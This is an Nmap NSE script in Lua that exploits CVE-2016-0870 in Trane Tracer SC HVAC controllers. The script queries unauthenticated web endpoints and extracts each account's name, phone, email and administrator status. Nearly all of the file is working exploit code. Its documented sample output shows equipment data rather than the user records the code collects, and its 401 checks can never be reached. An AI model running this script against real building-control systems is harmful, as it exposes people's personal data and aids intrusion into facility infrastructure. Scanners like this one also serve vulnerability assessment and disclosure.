local nmap = require "nmap"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local shortport = require "shortport"
local table = require "table"

description = [[
Trane Tracer SC is an intelligent field panel for communicating with HVAC equipment controllers. According to Trane U.S. Inc., Tracer SC is deployed across several sectors including Commercial Facilities and others.

Contents of specific directories on the Tracer SC are exposed with the web server application to unauthenticated users. These directories have sensitive information within the configuration files.

Valid on Trane Tracer SC version 4.20.1134 and below. Tested on 7/3/17.

$ git clone https://github.com/hkm/nmap-nse-scripts.git

References:
* https://ics-cert.us-cert.gov/advisories/ICSA-16-259-03
* http://www.cvedetails.com/cve/CVE-2016-0870/
* http://websec.mx

]]

---
-- @usage nmap -p80 --script http-vuln-cve2016-0870.nse <target>
--
-- @output
-- | trane-info:
-- |   serverName: TracerSC
-- |   serverTime: 2017-07-03T21:01:02-04:00
-- |   serverBootTime: 2017-06-25T03:14:38-04:00
-- |   vendorName: Trane
-- |   productName: Tracer SC
-- |   productVersion: v4.40.1211 (release)
-- |   kernelVersion: 2.6.30_HwVer12AB-hydra
-- |   hardwareType: HwVer12AB
-- |   hardwareSerialNumber: E15A#####
-- |   1:equipmentUri: /equipment/generic/generic/##
-- |   1:displayName: BOILER ROOMS
-- |   1:deviceName: BOILER ROOMS
-- |   1:equipmentFamily: Generic
-- |   1:roleDocument: BOILER_ROOMS
-- |   1:isOffline: false
-- |   2:equipmentUri: /equipment/generic/generic/##
-- |   2:displayName: BOILER ROOMS
-- |   2:deviceName: BOILER ROOMS
-- |   2:equipmentFamily: Generic
-- |   2:roleDocument: BOILER_ROOMS
-- |   2:isOffline: false
-- |   3:equipmentUri: /equipment/generic/generic/##
-- |   3:displayName: EXHAUSTS 3 RM-6
-- |   3:deviceName: EXHAUSTS 3 RM-6
-- |   3:equipmentFamily: Generic
-- |   3:roleDocument: EXHAUSTS_3_RM-6
-- |   3:isOffline: false
--
-- @xmloutput
-- <elem key="serverName">TracerSC </elem>
-- <elem key="serverTime">2017-07-03T21:01:02-04:00 </elem>
-- <elem key="serverBootTime">2017-06-25T03:14:38-04:00 </elem>
-- <elem key="vendorName">Trane </elem>
-- <elem key="productName">Tracer SC </elem>
-- <elem key="productVersion">v4.40.1211 (release) </elem>
-- -- <elem key="kernelVersion">2.6.30_HwVer12AB-hydra </elem>
-- <elem key="hardwareType">HwVer12AB </elem>
-- <elem key="hardwareSerialNumber">E15A##### </elem>
-- <elem key="1:equipmentUri">/equipment/generic/generic/## </elem>
-- <elem key="1:displayName">BOILER ROOMS </elem>
-- <elem key="1:deviceName">BOILER ROOMS </elem>
-- <elem key="1:equipmentFamily">Generic </elem>
-- <elem key="1:roleDocument">BOILER_ROOMS </elem>
-- <elem key="1:isOffline">false </elem>
-- <elem key="2:equipmentUri">/equipment/generic/generic/## </elem>
-- <elem key="2:displayName">BOILER ROOMS </elem>
-- <elem key="2:deviceName">BOILER ROOMS </elem>
-- <elem key="2:equipmentFamily">Generic </elem>
-- <elem key="2:roleDocument">BOILER_ROOMS </elem>
-- <elem key="2:isOffline">false </elem>
-- <elem key="3:equipmentUri">/equipment/generic/generic/## </elem>
-- <elem key="3:displayName">EXHAUSTS 3 RM-6 </elem>
-- <elem key="3:deviceName">EXHAUSTS 3 RM-6 </elem>
-- <elem key="3:equipmentFamily">Generic </elem>
-- <elem key="3:roleDocument">EXHAUSTS_3_RM-6 </elem>
-- <elem key="3:isOffline">false </elem>
---

author = "Pedro Joaquin <pjoaquin()websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.portnumber({80})

local output = stdnse.output_table()
local outputcol = "\nuserId, firstName, lastName, phoneNo, email, administrator, active,\n"

local count = 1

local function GetUserInfo(host, port, usernumber)
  --Get information from /evox/user/user/#usernumber#
  local uri = '/evox/user/user/'..usernumber
  local response = http.get(host, port, uri)
  if response['status-line'] and response['status-line']:match("200") then
    --Verify response and parsing of XML /evox/user/user/#usernumber#
    local xmlparsetest = response['body']:match('userId')
    if not xmlparsetest then
      stdnse.debug1("Problem with XML parsing. No users found in /evox/user/user")
	  return nil, "Problem with XML parsing. No users found in /evox/user/user"
	end
    if response['status-line'] and response['status-line']:match("401") then
      stdnse.debug1("401 Unauthorized")
	  return nil, "401 Unauthorized"
    end

    local keylist = {"userId","firstName","lastName","phoneNo","email", "administrator","active"}
    for _,key in ipairs(keylist) do
      stdnse.debug1("Looking for : "..key)
      output[count..":"..key] = response['body']:match(key..'" val=([^<]*) />')
	  output[count..":"..key] = string.gsub(output[count..":"..key],'"',"")
	  outputcol = outputcol..output[count..":"..key]..', '
	  stdnse.debug1("Found : "..output[count..":"..key])
    end
	count = count + 1 
	outputcol = outputcol .. '\n'
end
end

local function GetInformation(host, port)

  --Get information from /evox/user/user
  local uri = '/evox/user/user'
  local response = http.get(host, port, uri)
  if response['status-line'] and response['status-line']:match("200") then
    --Verify response and parsing of XML from /evox/user/user
    local xmlparsetest = response['body']:match('<ref href="([^<]*)/" is="trane:SC/user/user')
    if not xmlparsetest then
      stdnse.debug1("Problem with XML parsing. No users found in /evox/user/user")
	  return nil, "Problem with XML parsing. No users found in /evox/user/user"
	end
    if response['status-line'] and response['status-line']:match("401") then
      stdnse.debug1("401 Unauthorized")
	  return nil, "401 Unauthorized"
    end

	  --Parse information from /evox/user/user to get usernumbers
	  local _,lastuser = response['body']:find(".*trane:SC/user/user_")
	  stdnse.debug1("lastuser : "..lastuser)
	  local count = 0
	  local nextuser = 1
	  while nextuser < lastuser do
	  stdnse.debug1("lastuser : "..lastuser)
          output["usernumber"] = response['body']:match('<ref href="([^<]*)/" is="trane:SC/user/user',nextuser)
		  if output["usernumber"] == nil then
		    output["usernumber"] = "Not available"
		  else
		    stdnse.debug1("Found : "..output["usernumber"])
			GetUserInfo(host, port, output["usernumber"])
		  end
        _,nextuser = response['body']:find("trane:SC/user/user_",nextuser)
		stdnse.debug1("nextuser : "..nextuser)
	    count = count + 1
	    stdnse.debug1("Count : "..count)
	  end
	end

	return outputcol
  end


  
action = function(host,port)

  -- Identify servers that answer 200 to invalid HTTP requests and exit as these would invalidate the tests
  local status_404, result_404, _ = http.identify_404(host,port)
  if ( status_404 and result_404 == 200 ) then
    stdnse.debug1("Exiting due to ambiguous response from web server on %s:%s. All URIs return status 200.", host.ip, port.number)
    return nil
  end

  return GetInformation(host, port)
end
